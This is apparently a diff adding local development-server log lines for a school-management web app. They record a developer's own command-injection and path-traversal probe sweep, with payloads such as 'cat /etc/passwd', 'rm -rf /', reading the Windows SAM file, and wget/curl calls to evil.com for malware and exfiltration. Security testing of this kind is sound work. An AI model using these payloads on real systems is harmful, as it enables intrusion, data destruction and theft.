+2025-07-13 17:07:18,081 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:07:18] "[33mGET /manage_students?search=|+whoami HTTP/1.1[0m" 404 -
+2025-07-13 17:07:20,160 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:07:20] "[33mGET /manage_students?search=%26%26+dir HTTP/1.1[0m" 404 -
+2025-07-13 17:07:22,230 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:07:22] "[31m[1mGET /manage_students?search=;+cat+/etc/passwd HTTP/1.1[0m" 403 -
+2025-07-13 17:07:24,296 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:07:24] "[31m[1mGET /manage_students?search=|+type+C:\\Windows\\System32\\config\\sam HTTP/1.1[0m" 400 -
+2025-07-13 17:07:26,328 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:07:26] "[33mGET /manage_students?search=;+rm+-rf+/ HTTP/1.1[0m" 404 -
+2025-07-13 17:07:28,373 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:07:28] "[31m[1mGET /manage_students?search=%26%26+del+/f+/s+/q+C:\\* HTTP/1.1[0m" 400 -
+2025-07-13 17:07:30,403 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:07:30] "[33mGET /manage_students?search=;+wget+http://evil.com/malware.sh HTTP/1.1[0m" 404 -
+2025-07-13 17:07:32,443 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:07:32] "[33mGET /manage_students?search=|+curl+http://evil.com/exfiltrate.php HTTP/1.1[0m" 404 -
+2025-07-13 17:07:34,499 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:07:34] "[33mGET /manage_teachers?filter=;+ls+-la HTTP/1.1[0m" 404 -
+2025-07-13 17:07:36,554 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:07:36] "[33mGET /manage_teachers?filter=|+whoami HTTP/1.1[0m" 404 -
+2025-07-13 17:07:38,596 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:07:38] "[33mGET /manage_teachers?filter=%26%26+dir HTTP/1.1[0m" 404 -
+2025-07-13 17:07:40,632 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:07:40] "[31m[1mGET /manage_teachers?filter=;+cat+/etc/passwd HTTP/1.1[0m" 403 -
+2025-07-13 17:07:42,682 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:07:42] "[31m[1mGET /manage_teachers?filter=|+type+C:\\Windows\\System32\\config\\sam HTTP/1.1[0m" 400 -
+2025-07-13 17:07:44,735 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:07:44] "[33mGET /manage_teachers?filter=;+rm+-rf+/ HTTP/1.1[0m" 404 -
+2025-07-13 17:07:46,778 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:07:46] "[31m[1mGET /manage_teachers?filter=%26%26+del+/f+/s+/q+C:\\* HTTP/1.1[0m" 400 -
+2025-07-13 17:07:48,812 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:07:48] "[33mGET /manage_teachers?filter=;+wget+http://evil.com/malware.sh HTTP/1.1[0m" 404 -
+2025-07-13 17:07:50,860 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:07:50] "[33mGET /manage_teachers?filter=|+curl+http://evil.com/exfiltrate.php HTTP/1.1[0m" 404 -
+2025-07-13 17:07:53,043 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:07:53] "GET /headteacher/?action=;+ls+-la HTTP/1.1" 200 -
+2025-07-13 17:07:55,229 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:07:55] "GET /headteacher/?action=|+whoami HTTP/1.1" 200 -
+2025-07-13 17:07:57,410 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:07:57] "GET /headteacher/?action=%26%26+dir HTTP/1.1" 200 -
+2025-07-13 17:07:59,475 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:07:59] "[31m[1mGET /headteacher/?action=;+cat+/etc/passwd HTTP/1.1[0m" 403 -
+2025-07-13 17:08:01,527 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:08:01] "[31m[1mGET /headteacher/?action=|+type+C:\\Windows\\System32\\config\\sam HTTP/1.1[0m" 400 -
+2025-07-13 17:08:03,752 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:08:03] "GET /headteacher/?action=;+rm+-rf+/ HTTP/1.1" 200 -
+2025-07-13 17:08:05,794 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:08:05] "[31m[1mGET /headteacher/?action=%26%26+del+/f+/s+/q+C:\\* HTTP/1.1[0m" 400 -
+2025-07-13 17:08:07,962 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:08:07] "GET /headteacher/?action=;+wget+http://evil.com/malware.sh HTTP/1.1" 200 -
+2025-07-13 17:08:10,136 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:08:10] "GET /headteacher/?action=|+curl+http://evil.com/exfiltrate.php HTTP/1.1" 200 -
+2025-07-13 17:08:12,193 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:08:12] "[31m[1mGET /etc/passwd HTTP/1.1[0m" 403 -
+2025-07-13 17:08:14,253 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:08:14] "[31m[1mGET /static/..\\..\\..\\windows\\system32\\config\\sam HTTP/1.1[0m" 403 -
+2025-07-13 17:08:16,309 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:08:16] "[31m[1mGET /static/..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1[0m" 403 -
+2025-07-13 17:08:18,366 - werkzeug - INFO - 127.0.0.1 - - [13/Jul/2025 17:08:18] "[31m[1mGET /static/....//....//....//etc/passwd HTTP/1.1[0m" 403 -
+2025-07-13 17:14:49,068 - werkzeug - INFO -  * Detected change in 'E:\\cbc\\hillview_mvp\\new_structure\\models\\user.py', reloading
+2025-07-13 17:14:49,599 - werkzeug - INFO -  * Restarting with stat
+2025-07-13 17:14:52,258 - new_structure - INFO - Application logging configured
+2025-07-13 17:14:54,172 - mark_validation - INFO - Mark sanitizer middleware initialized
+2025-07-13 17:14:54,201 - new_structure - INFO - Application initialized
+2025-07-13 17:14:54,254 - werkzeug - WARNING -  * Debugger is active!
+2025-07-13 17:14:54,269 - werkzeug - INFO -  * Debugger PIN: 267-181-210
+2025-07-13 17:15:10,322 - werkzeug - INFO -  * Detected change in 'E:\\cbc\\hillview_mvp\\new_structure\\views\\auth.py', reloading
+2025-07-13 17:15:10,839 - werkzeug - INFO -  * Restarting with stat
+2025-07-13 17:15:13,191 - new_structure - INFO - Application logging configured
